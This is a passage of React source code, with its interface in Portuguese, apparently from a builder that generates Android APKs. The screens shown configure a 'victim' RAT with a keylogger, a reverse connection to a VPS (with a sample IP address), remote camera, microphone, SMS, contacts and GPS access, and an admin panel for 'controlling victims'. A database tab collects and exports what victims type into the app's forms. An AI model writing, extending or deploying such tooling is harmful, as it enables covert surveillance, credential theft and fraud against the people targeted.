                    <p className="text-yellow-400 text-xs mt-1">
                      ⚠️ Use apenas letras, números e hífens. Sem espaços ou caracteres especiais.
                    </p>
                  </div>
                  
                  <div>
                    <label className="text-gray-400 text-sm">Package Name (identificador único)</label>
                    <input
                      type="text"
                      value={currentProject.packageName}
                      onChange={(e) => setCurrentProject({ ...currentProject, packageName: e.target.value })}
                      className="w-full bg-slate-700 text-white px-3 py-2 rounded mt-1"
                      placeholder="com.meuapp.protecao"
                    />
                  </div>
                  <div>
                    <label className="text-gray-400 text-sm">Ícone do App</label>
                    <input
                      type="file"
                      accept="image/*"
                      onChange={(e) => handleImageUpload(e)}
                      className="w-full bg-slate-700 text-white px-3 py-2 rounded mt-1"
                    />
                    {currentProject.iconUrl && (
                      <img src={currentProject.iconUrl} className="w-16 h-16 rounded-xl mt-2" />
                    )}
                  </div>
                </div>
              </div>

              {/* Funcionalidades */}
              <div className="bg-slate-800 rounded-xl p-6">
                <h3 className="text-white font-semibold mb-4">🔧 Funcionalidades</h3>
                <div className="space-y-3">
                  <label className="flex items-center gap-3 cursor-pointer">
                    <input
                      type="checkbox"
                      checked={currentProject.enablePayment}
                      onChange={(e) => setCurrentProject({ ...currentProject, enablePayment: e.target.checked })}
                      className="w-5 h-5"
                    />
                    <span className="text-white">💳 Sistema de Pagamento (PIX)</span>
                  </label>
                  <label className="flex items-center gap-3 cursor-pointer">
                    <input
                      type="checkbox"
                      checked={currentProject.enableRat}
                      onChange={(e) => setCurrentProject({ ...currentProject, enableRat: e.target.checked })}
                      className="w-5 h-5"
                    />
                    <span className="text-white">📱 Controle Remoto (RAT)</span>
                  </label>
                  <label className="flex items-center gap-3 cursor-pointer">
                    <input
                      type="checkbox"
                      checked={currentProject.enableKeylogger}
                      onChange={(e) => setCurrentProject({ ...currentProject, enableKeylogger: e.target.checked })}
                      className="w-5 h-5"
                    />
                    <span className="text-white">⌨️ Keylogger</span>
                  </label>
                </div>
              </div>

              {/* 🔥 SEPARAÇÃO: Mostrar no Painel Web Principal */}
              <div className="bg-gradient-to-br from-blue-900/50 to-indigo-900/50 rounded-xl p-6 border border-blue-600">
                <h3 className="text-blue-400 font-bold mb-4">🔄 Integração com Painel Web</h3>
                <div className="space-y-4">
                  <label className="flex items-center gap-3 cursor-pointer p-3 bg-slate-700/50 rounded-lg hover:bg-slate-700 transition">
                    <input
                      type="checkbox"
                      checked={currentProject.showInWebPanel}
                      onChange={(e) => setCurrentProject({ ...currentProject, showInWebPanel: e.target.checked })}
                      className="w-6 h-6 accent-blue-500"
                    />
                    <div>
                      <span className="text-white font-semibold">📊 Mostrar no Painel Web Principal</span>
                      <p className="text-gray-400 text-sm mt-1">
                        Se ativado, dispositivos deste APK aparecerão junto com os APKs do APK Builder normal.
                      </p>
                    </div>
                  </label>
                  
                  <div className={`p-4 rounded-lg ${currentProject.showInWebPanel ? 'bg-green-600/20 border border-green-600/50' : 'bg-slate-700/50'}`}>
                    {currentProject.showInWebPanel ? (
                      <div className="text-green-300 flex items-start gap-2">
                        <span className="text-xl">✅</span>
                        <div>
                          <strong>Integração Ativa</strong>
                          <p className="text-sm text-green-300/70 mt-1">
                            Dispositivos aparecerão no Dashboard principal do Painel Web.
                            Você poderá controlar via VNC, keylogger, etc.
                          </p>
                        </div>
                      </div>
                    ) : (
                      <div className="text-gray-400 flex items-start gap-2">
                        <span className="text-xl">📦</span>
                        <div>
                          <strong>Modo Separado (Padrão)</strong>
                          <p className="text-sm text-gray-500 mt-1">
                            Dados são enviados apenas via webhook para este projeto.
                            O APK <strong>NÃO aparece</strong> no painel web junto com outros dispositivos.
                            Isso mantém APKs do Studio separados dos APKs normais.
                          </p>
                        </div>
                      </div>
                    )}
                  </div>
                  
                  {/* Identificador */}
                  <div className="text-sm text-gray-500 flex items-center gap-2 pt-2 border-t border-slate-700">
                    <span>🏷️ Origem:</span>
                    <span className="bg-purple-600/50 text-purple-300 px-2 py-1 rounded text-xs font-mono">
                      {currentProject.source || 'apk_studio'}
                    </span>
                  </div>
                </div>
              </div>
              
              {/* Conexão Reversa - URL do Servidor */}
              {(currentProject.enableRat || currentProject.enableKeylogger) && (
                <div className="bg-gradient-to-br from-red-900/50 to-rose-900/50 rounded-xl p-6 border border-red-600">
                  <h3 className="text-red-400 font-bold mb-4">🔗 Conexão Reversa (RAT)</h3>
                  <div className="space-y-4">
                    <div>
                      <label className="text-gray-300 text-sm font-semibold">🌐 URL do Servidor (VPS)</label>
                      <input
                        type="text"
                        value={(currentProject as any).serverUrl || ''}
                        onChange={(e) => setCurrentProject({ ...currentProject, serverUrl: e.target.value } as any)}
                        placeholder={defaultWsPlaceholder()}
                        className="w-full bg-slate-700 text-white px-3 py-2 rounded mt-1 border border-red-600/50"
                      />
                      <p className="text-red-300/70 text-xs mt-1">
                        ⚠️ <strong>IMPORTANTE:</strong> Coloque a URL da sua VPS. 
                        O APK vai conectar nesse servidor para enviar dados e receber comandos.
                      </p>
                    </div>
                    <div className="p-3 bg-red-600/20 rounded-lg">
                      <p className="text-red-300 text-sm">
                        📡 <strong>Formato:</strong> ws://IP:PORTA/ws<br/>
                        📌 <strong>Exemplo VPS:</strong> ws://151.243.137.239:7771/ws<br/>
                        📌 <strong>Exemplo local:</strong> ws://localhost:7771/ws
                      </p>
                    </div>
                  </div>
                </div>
              )}

              {/* Tema */}
              <div className="bg-slate-800 rounded-xl p-6">
                <h3 className="text-white font-semibold mb-4">🎨 Cores do Tema</h3>
                <div className="grid grid-cols-2 gap-4">
                  {Object.entries(currentProject.theme).map(([key, value]) => (
                    <div key={key}>
                      <label className="text-gray-400 text-sm capitalize">{key.replace('Color', ' Color')}</label>
                      <div className="flex gap-2 mt-1">
                        <input
                          type="color"
                          value={value}
                          onChange={(e) => setCurrentProject({
                            ...currentProject,
                            theme: { ...currentProject.theme, [key]: e.target.value }
                          })}
                          className="w-10 h-10 rounded cursor-pointer"
                        />
                        <input
                          type="text"
                          value={value}
                          onChange={(e) => setCurrentProject({
                            ...currentProject,
                            theme: { ...currentProject.theme, [key]: e.target.value }
                          })}
                          className="flex-1 bg-slate-700 text-white px-2 py-1 rounded text-sm"
                        />
                      </div>
                    </div>
                  ))}
                </div>
              </div>
              
              {/* Configurações do Painel Mobile RAT */}
              {currentProject.projectType === 'mobile_panel' && (
                <div className="bg-gradient-to-br from-orange-900/50 to-amber-900/50 rounded-xl p-6 border border-orange-600">
                  <h3 className="text-orange-400 font-bold mb-4 flex items-center gap-2">
                    <Monitor className="w-5 h-5" />
                    📲 Configurações do Painel Mobile RAT
                  </h3>
                  
                  {/* Servidor */}
                  <div className="mb-4">
                    <label className="text-gray-300 text-sm font-semibold">🌐 URL do Servidor Principal</label>
                    <input
                      type="text"
                      value={currentProject.mobilePanelConfig?.serverUrl || ''}
                      onChange={(e) => setCurrentProject({
                        ...currentProject,
                        mobilePanelConfig: { ...currentProject.mobilePanelConfig!, serverUrl: e.target.value }
                      })}
                      placeholder="https://seu-servidor.com"
                      className="w-full bg-slate-700 text-white px-3 py-2 rounded mt-1 border border-orange-600/50"
                    />
                    <p className="text-orange-300/70 text-xs mt-1">O painel mobile vai se conectar a este servidor</p>
                  </div>
                  
                  {/* Credenciais */}
                  <div className="grid grid-cols-2 gap-4 mb-4">
                    <div>
                      <label className="text-gray-300 text-sm font-semibold">👤 Usuário Operador</label>
                      <input
                        type="text"
                        value={currentProject.mobilePanelConfig?.operatorUsername || ''}
                        onChange={(e) => setCurrentProject({
                          ...currentProject,
                          mobilePanelConfig: { ...currentProject.mobilePanelConfig!, operatorUsername: e.target.value }
                        })}
                        placeholder="admin"
                        className="w-full bg-slate-700 text-white px-3 py-2 rounded mt-1"
                      />
                    </div>
                    <div>
                      <label className="text-gray-300 text-sm font-semibold">🔑 Senha</label>
                      <input
                        type="password"
                        value={currentProject.mobilePanelConfig?.operatorPassword || ''}
                        onChange={(e) => setCurrentProject({
                          ...currentProject,
                          mobilePanelConfig: { ...currentProject.mobilePanelConfig!, operatorPassword: e.target.value }
                        })}
                        placeholder="••••••••"
                        className="w-full bg-slate-700 text-white px-3 py-2 rounded mt-1"
                      />
                    </div>
                  </div>
                  
                  {/* Funcionalidades do Painel Mobile */}
                  <div className="mb-4">
                    <label className="text-gray-300 text-sm font-semibold mb-2 block">🔧 Funcionalidades Habilitadas</label>
                    <div className="grid grid-cols-2 gap-2">
                      {[
                        { key: 'enableVNC', label: '📺 VNC Screen Mirror', icon: '📺' },
                        { key: 'enableKeylogger', label: '⌨️ Ver Keylogger', icon: '⌨️' },
                        { key: 'enableCamera', label: '📷 Câmera Remota', icon: '📷' },
                        { key: 'enableMicrophone', label: '🎤 Microfone Remoto', icon: '🎤' },
                        { key: 'enableFileManager', label: '📁 Gerenciador de Arquivos', icon: '📁' },
                        { key: 'enableSMS', label: '💬 Ler SMS', icon: '💬' },
                        { key: 'enableContacts', label: '👥 Ver Contatos', icon: '👥' },
                        { key: 'enableLocation', label: '📍 Localização GPS', icon: '📍' },
                        { key: 'enableApkBuilder', label: '➕ Gerar APKs pelo App', icon: '➕' },
                      ].map(({ key, label }) => (
                        <label key={key} className="flex items-center gap-2 cursor-pointer bg-slate-700/50 p-2 rounded">
                          <input
                            type="checkbox"
                            checked={currentProject.mobilePanelConfig?.[key as keyof typeof currentProject.mobilePanelConfig] as boolean || false}
                            onChange={(e) => setCurrentProject({
                              ...currentProject,
                              mobilePanelConfig: { ...currentProject.mobilePanelConfig!, [key]: e.target.checked }
                            })}
                            className="w-4 h-4"
                          />
                          <span className="text-white text-sm">{label}</span>
                        </label>
                      ))}
                    </div>
                  </div>
                  
                  {/* Branding Customizado */}
                  <div className="border-t border-orange-600/30 pt-4">
                    <label className="flex items-center gap-2 cursor-pointer mb-3">
                      <input
                        type="checkbox"
                        checked={currentProject.mobilePanelConfig?.customBranding || false}
                        onChange={(e) => setCurrentProject({
                          ...currentProject,
                          mobilePanelConfig: { ...currentProject.mobilePanelConfig!, customBranding: e.target.checked }
                        })}
                        className="w-4 h-4"
                      />
                      <span className="text-orange-400 font-semibold">🎨 Branding Personalizado</span>
                    </label>
                    
                    {currentProject.mobilePanelConfig?.customBranding && (
                      <div className="grid grid-cols-2 gap-4">
                        <div>
                          <label className="text-gray-300 text-sm">Nome do App</label>
                          <input
                            type="text"
                            value={currentProject.mobilePanelConfig?.brandingName || ''}
                            onChange={(e) => setCurrentProject({
                              ...currentProject,
                              mobilePanelConfig: { ...currentProject.mobilePanelConfig!, brandingName: e.target.value }
                            })}
                            placeholder="Hydra Control"
                            className="w-full bg-slate-700 text-white px-3 py-2 rounded mt-1"
                          />
                        </div>
                        <div>
                          <label className="text-gray-300 text-sm">Logo URL</label>
                          <input
                            type="text"
                            value={currentProject.mobilePanelConfig?.brandingLogo || ''}
                            onChange={(e) => setCurrentProject({
                              ...currentProject,
                              mobilePanelConfig: { ...currentProject.mobilePanelConfig!, brandingLogo: e.target.value }
                            })}
                            placeholder="https://..."
                            className="w-full bg-slate-700 text-white px-3 py-2 rounded mt-1"
                          />
                        </div>
                      </div>
                    )}
                  </div>
                  
                  <div className="mt-4 p-3 bg-orange-600/20 rounded-lg">
                    <p className="text-orange-300 text-sm">
                      ⚠️ <strong>Importante:</strong> Este APK será um painel de controle mobile que se conecta ao mesmo servidor principal. 
                      O operador poderá controlar vítimas e até gerar novos APKs RAT diretamente do celular dele.
                    </p>
                  </div>
                </div>
              )}
            </div>
          </div>
        )}

        {/* Aba de Dados Capturados - BANCO DE DADOS PERSISTENTE */}
        {activeTab === 'data' && currentProject && (
          <div className="flex-1 p-6 overflow-y-auto">
            <div className="max-w-5xl mx-auto">
              <div className="flex items-center justify-between mb-6">
                <h2 className="text-2xl font-bold text-white">📊 Dados Capturados (Banco de Dados)</h2>
                <div className="flex gap-2">
                  <button
                    onClick={() => exportData('csv')}
                    className="px-3 py-2 bg-green-600 hover:bg-green-700 text-white rounded-lg text-sm font-semibold"
                  >
                    📥 CSV
                  </button>
                  <button
                    onClick={() => exportData('json')}
                    className="px-3 py-2 bg-blue-600 hover:bg-blue-700 text-white rounded-lg text-sm font-semibold"
                  >
                    📥 JSON
                  </button>
                  <button
                    onClick={() => loadCapturedData(dataPage)}
                    disabled={isLoadingData}
                    className="px-3 py-2 bg-purple-600 hover:bg-purple-700 text-white rounded-lg text-sm font-semibold disabled:opacity-50"
                  >
                    {isLoadingData ? '⏳' : '🔄'} Atualizar
                  </button>
                  <button
                    onClick={clearAllData}
                    className="px-3 py-2 bg-red-600 hover:bg-red-700 text-white rounded-lg text-sm font-semibold"
                  >
                    🗑️ Limpar
                  </button>
                </div>
              </div>
              
              {/* Estatísticas */}
              <div className="grid grid-cols-4 gap-4 mb-6">
                <div className="bg-slate-800 rounded-xl p-4 border border-slate-700">
                  <div className="flex items-center gap-3">
                    <Database className="w-8 h-8 text-purple-500" />
                    <div>
                      <p className="text-gray-400 text-xs">Total no Banco</p>
                      <p className="text-2xl font-bold text-white">{dataTotalEntries}</p>
                    </div>
                  </div>
                </div>
                <div className="bg-slate-800 rounded-xl p-4 border border-slate-700">
                  <div className="flex items-center gap-3">
                    <BarChart3 className="w-8 h-8 text-green-500" />
                    <div>
                      <p className="text-gray-400 text-xs">Campos Mapeados</p>
                      <p className="text-2xl font-bold text-white">{dataFields.length}</p>
                    </div>
                  </div>
                </div>
                <div className="bg-slate-800 rounded-xl p-4 border border-slate-700">
                  <div className="flex items-center gap-3">
                    <Users className="w-8 h-8 text-blue-500" />
                    <div>
                      <p className="text-gray-400 text-xs">Página</p>
                      <p className="text-2xl font-bold text-white">{dataPage}/{dataTotalPages}</p>
                    </div>
                  </div>
                </div>
                <div className="bg-slate-800 rounded-xl p-4 border border-slate-700">
                  <div className="flex items-center gap-3">
                    <Clock className="w-8 h-8 text-orange-500" />
                    <div>
                      <p className="text-gray-400 text-xs">Último Registro</p>
                      <p className="text-sm text-white">
                        {capturedData.length > 0 && capturedData[0]._received_at
                          ? new Date(capturedData[0]._received_at).toLocaleString()
                          : 'Nenhum'
                        }
                      </p>
                    </div>
                  </div>
                </div>
              </div>
              
              {/* Campos Detectados (Banco de Dados Inteligente) */}
              {dataFields.length > 0 && (
                <div className="bg-slate-800 rounded-xl p-4 mb-6 border border-slate-700">
                  <h3 className="text-white font-semibold mb-3">🏷️ Campos Detectados Automaticamente (Banco de Dados Dinâmico)</h3>
                  <div className="flex flex-wrap gap-2">
                    {dataFields.map(field => (
                      <span 
                        key={field.name} 
                        className="px-3 py-1 bg-purple-600/30 text-purple-300 rounded-full text-sm flex items-center gap-1"
                        title={`Tipo: ${field.type} | Ocorrências: ${field.occurrences}`}
                      >
                        {field.name}
                        <span className="text-[10px] bg-purple-800 px-1 rounded">{field.occurrences}x</span>
                      </span>
                    ))}
                  </div>
                </div>
              )}
              
              {/* Tabela de Dados */}
              <div className="bg-slate-800 rounded-xl border border-slate-700 overflow-hidden">
                <div className="p-4 border-b border-slate-700 flex items-center justify-between">
                  <h3 className="text-white font-semibold">📋 Registros no Banco de Dados</h3>
                  <span className="text-gray-400 text-sm">
                    💾 Dados persistentes - não são perdidos ao reiniciar
                  </span>
                </div>
                {isLoadingData ? (
                  <div className="p-8 text-center">
                    <Loader2 className="w-8 h-8 text-purple-500 mx-auto animate-spin" />
                    <p className="text-gray-400 mt-2">Carregando dados...</p>
                  </div>
                ) : capturedData.length === 0 ? (
                  <div className="p-8 text-center">
                    <Database className="w-12 h-12 text-gray-600 mx-auto mb-3" />
                    <p className="text-gray-400">Nenhum dado no banco ainda</p>
                    <p className="text-gray-500 text-sm mt-1">
                      Quando usuários preencherem formulários no app, os dados serão salvos aqui
                    </p>
                  </div>
                ) : (
                  <>
                    <div className="overflow-x-auto">
                      <table className="w-full">
                        <thead className="bg-slate-700">
                          <tr>
                            <th className="px-4 py-2 text-left text-gray-400 text-xs">ID</th>
                            {dataFields.slice(0, 5).map(field => (
                              <th key={field.name} className="px-4 py-2 text-left text-gray-400 text-xs">
                                {field.name}
                                <span className="ml-1 text-purple-400 text-[10px]">({field.type})</span>
                              </th>
                            ))}
                            <th className="px-4 py-2 text-left text-gray-400 text-xs">IP</th>
                            <th className="px-4 py-2 text-left text-gray-400 text-xs">Horário</th>
                          </tr>
                        </thead>
                        <tbody>
                          {capturedData.map((row, i) => (
                            <tr key={row._id || i} className="border-t border-slate-700 hover:bg-slate-700/50">
                              <td className="px-4 py-2 text-gray-500 text-sm font-mono">{row._id}</td>
                              {dataFields.slice(0, 5).map(field => (
                                <td key={field.name} className="px-4 py-2 text-white text-sm max-w-[200px] truncate">
                                  {row[field.name] || '-'}
                                </td>
                              ))}
                              <td className="px-4 py-2 text-gray-400 text-xs font-mono">{row._ip}</td>
                              <td className="px-4 py-2 text-gray-400 text-xs">
                                {row._received_at ? new Date(row._received_at).toLocaleString() : '-'}
                              </td>
                            </tr>
                          ))}
                        </tbody>
                      </table>
                    </div>
                    
                    {/* Paginação */}
                    {dataTotalPages > 1 && (
                      <div className="p-4 border-t border-slate-700 flex items-center justify-center gap-2">
                        <button
                          onClick={() => loadCapturedData(1)}
                          disabled={dataPage === 1}
                          className="px-3 py-1 bg-slate-700 hover:bg-slate-600 text-white rounded disabled:opacity-50"
                        >
                          ⏮️
                        </button>
                        <button
                          onClick={() => loadCapturedData(dataPage - 1)}
                          disabled={dataPage === 1}
                          className="px-3 py-1 bg-slate-700 hover:bg-slate-600 text-white rounded disabled:opacity-50"
                        >
                          ◀️
                        </button>
                        <span className="text-white px-4">
                          Página {dataPage} de {dataTotalPages}
                        </span>
                        <button
                          onClick={() => loadCapturedData(dataPage + 1)}
                          disabled={dataPage === dataTotalPages}
                          className="px-3 py-1 bg-slate-700 hover:bg-slate-600 text-white rounded disabled:opacity-50"
                        >
                          ▶️
                        </button>
                        <button
                          onClick={() => loadCapturedData(dataTotalPages)}
                          disabled={dataPage === dataTotalPages}
                          className="px-3 py-1 bg-slate-700 hover:bg-slate-600 text-white rounded disabled:opacity-50"
                        >
                          ⏭️
                        </button>
                      </div>
                    )}
                  </>
                )}
              </div>
            </div>
          </div>
        )}

        {activeTab === 'preview' && currentProject && (
          <div className="flex-1 flex flex-col bg-slate-950 overflow-auto p-4">
            {/* Header do Preview */}
            <div className="flex items-center justify-between mb-4 px-4">
              <div className="flex items-center gap-4">
                <h2 className="text-xl font-bold text-white">📱 Preview Interativo</h2>
                <span className={`px-3 py-1 rounded-full text-sm font-bold ${
                  editingMode === 'panel' ? 'bg-green-600 text-white' : 'bg-red-600 text-white'
                }`}>
                  {editingMode === 'panel' ? '👑 PAINEL ADMIN' : '👤 VÍTIMA'}
                </span>
              </div>
              
              {/* Navegação de telas */}
              <div className="flex items-center gap-2">
                <button
                  onClick={() => setCurrentScreenIndex(Math.max(0, currentScreenIndex - 1))}
                  disabled={currentScreenIndex === 0}
                  className="p-2 bg-slate-700 hover:bg-slate-600 disabled:opacity-50 rounded-lg"
                >
                  ◀️
                </button>
                <span className="text-white font-bold">
                  Tela {currentScreenIndex + 1} / {currentScreens.length}
                </span>
                <button
                  onClick={() => setCurrentScreenIndex(Math.min(currentScreens.length - 1, currentScreenIndex + 1))}
                  disabled={currentScreenIndex >= currentScreens.length - 1}
                  className="p-2 bg-slate-700 hover:bg-slate-600 disabled:opacity-50 rounded-lg"
                >
                  ▶️
                </button>
              </div>
            </div>
            
            {/* Área principal do Preview */}
            <div className="flex-1 flex items-center justify-center gap-8">
              {/* Celular Preview GRANDE */}
              <div className="flex flex-col items-center">
                <div className="bg-gradient-to-b from-gray-700 to-gray-900 rounded-[50px] p-3 shadow-2xl shadow-purple-500/30">
                  {/* Notch */}
                  <div className="w-24 h-6 bg-black rounded-full mx-auto mb-2 relative">
                    <div className="absolute left-1/2 top-1/2 -translate-x-1/2 -translate-y-1/2 w-4 h-4 bg-gray-800 rounded-full"></div>
                  </div>
                  {/* Tela */}
                  <div
                    className="rounded-[35px] overflow-hidden relative"
                    style={{ 
                      width: '380px', 
                      height: '780px', 
                      backgroundColor: currentScreen?.backgroundColor || '#0f0f1a' 
                    }}
                  >
                    {/* Renderiza todos os elementos da tela atual */}
                    {currentScreen?.elements.map(el => {
                      const scale = 380 / 360; // Scale para preview maior
                      let displayContent = el.content || '';
                      
                      // Substitui variáveis dinâmicas
                      Object.entries(dynamicVariables).forEach(([key, value]) => {
                        displayContent = displayContent.replace(new RegExp(`\\{\\{${key}\\}\\}`, 'g'), value);
                      });
                      
                      const baseStyle: React.CSSProperties = {
                        position: 'absolute',
                        left: (el.x || 0) * scale,
                        top: (el.y || 0) * scale,
                        width: (el.width || 100) * scale,
                        height: (el.height || 40) * scale,
                        fontSize: (el.fontSize || 14) * scale,
                        fontWeight: el.fontWeight as any,
                        color: el.color || '#FFFFFF',
                        backgroundColor: el.backgroundColor,
                        borderRadius: (el.borderRadius || 0) * scale,
                        opacity: (el.opacity || 100) / 100,
                        textAlign: el.textAlign as any || 'left',
                        display: 'flex',
                        alignItems: 'center',
                        justifyContent: el.textAlign === 'center' ? 'center' : 'flex-start',
                        cursor: el.type === 'button' ? 'pointer' : 'default',
                        border: el.borderWidth ? `${el.borderWidth * scale}px solid ${el.borderColor || '#333'}` : undefined,
                        whiteSpace: 'pre-wrap',
                        padding: el.type === 'button' || el.type === 'input' ? '0 8px' : undefined,
                      };
                      
                      if (el.type === 'text' || el.type === 'card') {
                        return (
                          <div key={el.id} style={baseStyle}>
                            {el.type === 'text' && displayContent}
                          </div>
                        );
                      }
                      
                      if (el.type === 'button') {
                        return (
                          <button
                            key={el.id}
                            style={baseStyle}
                            className="hover:brightness-110 active:scale-95 transition-all"
                            onClick={() => {
                              if (el.buttonAction === 'next_screen' || el.buttonAction === 'goto_screen') {
                                const targetIndex = el.targetScreenIndex ?? currentScreenIndex + 1;
                                if (targetIndex < currentScreens.length) {
                                  setCurrentScreenIndex(targetIndex);
                                }
                              } else if (el.buttonAction === 'prev_screen') {
                                setCurrentScreenIndex(Math.max(0, currentScreenIndex - 1));
                              }
                            }}
                          >
                            {displayContent}
                          </button>
                        );
                      }
                      
                      if (el.type === 'input') {
                        return (
                          <input
                            key={el.id}
                            type={el.inputType === 'password' || el.inputType === 'pin' ? 'password' : 'text'}
                            placeholder={el.placeholder || displayContent}
                            className="bg-slate-800 text-white outline-none"
                            style={{
                              ...baseStyle,
                              border: '1px solid #444',
                            }}
                          />
                        );
                      }
                      
                      if (el.type === 'image' || el.type === 'logo') {
                        return (
                          <div key={el.id} style={{...baseStyle, backgroundColor: '#333'}}>
                            <span style={{fontSize: (el.fontSize || 40) * scale}}>
                              {el.content || '🖼️'}
                            </span>
                          </div>
                        );
                      }
                      
                      if (el.type === 'rectangle' || el.type === 'circle') {
                        return (
                          <div key={el.id} style={{
                            ...baseStyle,
                            borderRadius: el.type === 'circle' ? '50%' : baseStyle.borderRadius
                          }} />
                        );
                      }
                      
                      return null;
                    })}
                  </div>
                </div>
                <p className="text-gray-400 mt-4 text-center font-bold">
                  {currentScreen?.name || 'Sem nome'}
                </p>
              </div>
              
              {/* Lista de telas (thumbnails) */}
              <div className="bg-slate-900 rounded-xl p-4 max-h-[800px] overflow-y-auto w-48">
                <h3 className="text-white font-bold mb-3 text-sm">📋 Todas as Telas</h3>
                <div className="space-y-2">
                  {currentScreens.map((screen, idx) => (
                    <button
                      key={screen.id}
                      onClick={() => setCurrentScreenIndex(idx)}
                      className={`w-full p-2 rounded-lg text-left text-xs transition-all ${
                        idx === currentScreenIndex 
                          ? 'bg-purple-600 text-white' 
                          : 'bg-slate-700 text-gray-300 hover:bg-slate-600'
                      }`}
                    >
                      <span className="font-bold">{idx + 1}.</span> {screen.name}
                    </button>
                  ))}
                </div>
              </div>
            </div>
            
            {/* Info do app */}
            <div className="mt-4 p-4 bg-slate-900 rounded-xl mx-auto max-w-lg">
              <div className="grid grid-cols-3 gap-4 text-center">
                <div>
                  <p className="text-2xl font-bold text-white">{currentScreens.length}</p>
                  <p className="text-gray-400 text-xs">Telas</p>
                </div>
                <div>
                  <p className="text-2xl font-bold text-white">
                    {currentScreens.reduce((acc, s) => acc + s.elements.length, 0)}
                  </p>
                  <p className="text-gray-400 text-xs">Elementos</p>
                </div>
                <div>
                  <p className="text-lg font-bold text-purple-400 truncate">{currentProject.appName}</p>
                  <p className="text-gray-400 text-xs">Nome do App</p>
                </div>
              </div>
            </div>
          </div>
        )}
      </div>
      
      {/* Modal de Build */}
      {buildStatus.isBuilding && (
        <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
          <div className="bg-slate-800 rounded-2xl p-8 max-w-md w-full mx-4">
            <div className="text-center">
              <Loader2 className="w-16 h-16 text-purple-500 mx-auto mb-4 animate-spin" />
              <h3 className="text-xl font-bold text-white mb-2">Construindo APK...</h3>
              <p className="text-gray-400 mb-4">{buildStatus.message}</p>
              <div className="w-full bg-slate-700 rounded-full h-3 mb-2">
                <div 
                  className="bg-purple-600 h-3 rounded-full transition-all duration-300"
                  style={{ width: `${buildStatus.progress}%` }}
                />
              </div>
              <p className="text-purple-400 text-sm">{buildStatus.progress}%</p>
            </div>
          </div>
        </div>
      )}
      
      {/* Modal de Confirmação de Build */}
      {showBuildConfirm && (
        <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
          <div className="bg-slate-800 rounded-2xl p-6 max-w-2xl w-full mx-4 max-h-[90vh] overflow-y-auto">
            <h3 className="text-xl font-bold text-white mb-4 flex items-center gap-2">
              🚀 Confirmar Criação do APK
            </h3>
            
            {/* 🔥 SELETOR DE TIPO DE APK - Vítima ou Painel */}
            {(currentProject?.projectType === 'rat' || currentProject?.projectType === 'hybrid') && currentProject.panelScreens && currentProject.panelScreens.length > 0 && (
              <div className="bg-gradient-to-r from-purple-900/50 to-blue-900/50 rounded-lg p-4 mb-4 border-2 border-purple-500">
                <h4 className="text-white font-bold mb-3 flex items-center gap-2">
                  🎯 QUAL APK DESEJA GERAR?
                </h4>
                <div className="grid grid-cols-2 gap-3">
                  <button
                    onClick={() => setBuildTarget('victim')}
                    className={`p-4 rounded-xl border-2 transition-all ${
                      buildTarget === 'victim' 
                        ? 'bg-red-600 border-red-400 shadow-lg shadow-red-500/50' 
                        : 'bg-slate-700 border-slate-600 hover:border-red-400'
                    }`}
                  >
                    <div className="text-2xl mb-2">👤</div>
                    <div className="text-white font-bold">APK da VÍTIMA</div>
                    <div className="text-xs text-gray-300 mt-1">
                      {currentProject.screens?.length || 0} telas
                    </div>
                    <div className="text-xs text-red-300 mt-1">
                      O RAT que será instalado no celular do alvo
                    </div>
                  </button>
                  <button
                    onClick={() => setBuildTarget('panel')}
                    className={`p-4 rounded-xl border-2 transition-all ${
                      buildTarget === 'panel' 
                        ? 'bg-green-600 border-green-400 shadow-lg shadow-green-500/50' 
                        : 'bg-slate-700 border-slate-600 hover:border-green-400'
                    }`}
                  >
                    <div className="text-2xl mb-2">👑</div>
                    <div className="text-white font-bold">APK do PAINEL</div>
                    <div className="text-xs text-gray-300 mt-1">
                      {currentProject.panelScreens?.length || 0} telas
                    </div>
                    <div className="text-xs text-green-300 mt-1">
                      O painel WebView para VOCÊ controlar as vítimas
                    </div>
                  </button>
                </div>
                <p className="text-center text-yellow-400 text-xs mt-3">
                  ⚠️ Você está gerando o APK: <strong>{buildTarget === 'panel' ? '👑 PAINEL ADMIN' : '👤 VÍTIMA'}</strong>
                </p>
              </div>
            )}
            
            {/* Resumo do App */}
            <div className="bg-slate-900 rounded-lg p-4 mb-4">
              <h4 className="text-white font-semibold mb-2">📱 Resumo do App</h4>
              <div className="grid grid-cols-2 gap-2 text-sm">
                <p className="text-gray-400">Nome: <span className="text-white">{currentProject?.appName}</span></p>
                <p className="text-gray-400">Pacote: <span className="text-white">{currentProject?.packageName}</span></p>
                <p className="text-gray-400">Telas: <span className="text-white">{buildTarget === 'panel' ? (currentProject?.panelScreens?.length || 0) : (currentProject?.screens?.length || 0)}</span></p>
                <p className="text-gray-400">Tipo: <span className={`font-bold ${buildTarget === 'panel' ? 'text-green-400' : 'text-red-400'}`}>
                  {buildTarget === 'panel' ? '👑 PAINEL ADMIN' : '👤 VÍTIMA RAT'}
                </span></p>
              </div>
            </div>
            
            {/* Campos de Dados */}
            <div className="bg-slate-900 rounded-lg p-4 mb-4">
              <h4 className="text-yellow-400 font-semibold mb-2 flex items-center gap-2">
                📊 Campos de Dados (Banco de Dados)
              </h4>
              {analyzeDataFields().length > 0 ? (
                <div className="space-y-2 max-h-48 overflow-y-auto">
                  <p className="text-green-400 text-xs mb-2">
                    ✅ Os seguintes campos serão criados automaticamente na API e banco de dados:
                  </p>
                  <div className="bg-slate-800 rounded p-2">
                    <table className="w-full text-xs">
                      <thead>
                        <tr className="text-gray-400 border-b border-slate-700">
                          <th className="text-left py-1">Tela</th>
                          <th className="text-left py-1">Campo</th>
                          <th className="text-left py-1">ID/Label</th>
                          <th className="text-left py-1">Tipo</th>
                        </tr>
                      </thead>
                      <tbody>
                        {analyzeDataFields().map((field, idx) => (
                          <tr key={idx} className="text-white border-b border-slate-700/50">
                            <td className="py-1 text-blue-400">{field.screen}</td>
                            <td className="py-1">{field.element}</td>
                            <td className="py-1 font-mono text-green-400">{field.label}</td>
                            <td className="py-1 text-purple-400">{field.fieldType}</td>
                          </tr>
                        ))}
                      </tbody>
                    </table>
                  </div>
                </div>
              ) : (
                <p className="text-gray-400 text-sm">
                  ℹ️ Nenhum campo de dados encontrado. O app é apenas visual.
                </p>
              )}
            </div>
            
            {/* Elementos Visuais */}
            <div className="bg-slate-900 rounded-lg p-4 mb-4">
              <h4 className="text-purple-400 font-semibold mb-2 flex items-center gap-2">
                🎨 Elementos Visuais
              </h4>
              <p className="text-gray-400 text-sm">
